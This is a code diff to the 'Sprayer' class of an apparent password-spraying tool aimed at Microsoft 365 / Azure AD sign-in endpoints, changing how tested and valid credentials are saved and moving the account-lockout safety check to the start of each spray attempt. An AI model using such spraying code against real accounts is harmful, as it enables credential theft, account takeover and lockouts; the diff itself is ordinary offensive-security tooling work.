@@ -47,10 +47,10 @@ class Sprayer:
 
     def shutdown(self, key=False):
         # Print new line after ^C
-        msg = '\n[*] Writing valid credentials found to file \'%svalid_users\'...' % self.args.output
+        msg  = '\n[*] Writing valid credentials found to file \'%s/spray/valid_users\'...' % self.args.output
+        msg += '\n[*] Please see %s/spray/sprayed_creds.txt for all spray attempts.' % self.args.output
         if key:
-            msg  = '\n[!] CTRL-C caught.' + msg
-            msg += '\n[*] Please see %s/spray/sprayed_creds.txt for all spray attempts.' % self.args.output
+            msg = '\n[!] CTRL-C caught.' + msg
         print(msg)
 
         # https://stackoverflow.com/a/48351410
@@ -61,9 +61,8 @@ class Sprayer:
         atexit.unregister(concurrent.futures.thread._python_exit)
         self.executor.shutdown = lambda wait:None
 
-        if key:
-            # Write the tested creds
-            self.helper.write_tested(self.tested_creds, "%s/spray/sprayed_creds.txt" % (self.args.output))
+        # Write the tested creds
+        self.helper.write_tested(self.tested_creds, "%s/spray/sprayed_creds.txt" % (self.args.output))
 
         # Write the valid accounts
         self.helper.write_data(self.valid_creds, "%s/spray/valid_users.txt" % (self.args.output))
@@ -127,6 +126,10 @@ class Sprayer:
     # https://github.com/Raikia/UhOh365
     def _autodiscover(self, user, password):
         try:
+            # Check if we hit our locked account limit, and stop
+            if self.lockout >= self.args.safe:
+                return
+
             # Build email if not already built
             email = self.helper.check_email(user, self.args.domain)
 
@@ -173,11 +176,7 @@ class Sprayer:
                             # This is where we handle lockout termination
                             # For now, we will just stop future sprays if a single lockout is hit
                             if code == "AADSTS50053":
-                                self.lockout += 1     # Mark lockout as True to tell main code to stop
-                                # Check if we hit our limit
-                                # TODO: Test this...
-                                if self.lockout == self.args.safe:
-                                    self.shutdown()
+                                self.lockout += 1  # Mark lockout as True to tell main code to stop
 
                             err = Config.AADSTS_codes[code][0]
                             msg = password + " (%s. Removing from spray rotation.)\n" % (Config.AADSTS_codes[code][1])
@@ -197,6 +196,10 @@ class Sprayer:
     # https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
     def _msol(self):
         try:
+            # Check if we hit our locked account limit, and stop
+            if self.lockout >= self.args.safe:
+                return
+
             # Build email if not already built
             email = self.helper.check_email(user, self.args.domain)
 
@@ -236,11 +239,7 @@ class Sprayer:
                     # This is where we handle lockout termination
                     # For now, we will just stop future sprays if a single lockout is hit
                     if code == "AADSTS50053":
-                        self.lockout += 1     # Mark lockout as True to tell main code to stop
-                        # Check if we hit our limit
-                        # TODO: Test this...
-                        if self.lockout == self.args.safe:
-                            self.shutdown()
+                        self.lockout += 1  # Mark lockout as True to tell main code to stop
 
                     err = Config.AADSTS_codes[code][0]
                     msg = password + " (%s. Removing from spray rotation.)\n" % (Config.AADSTS_codes[code][1])
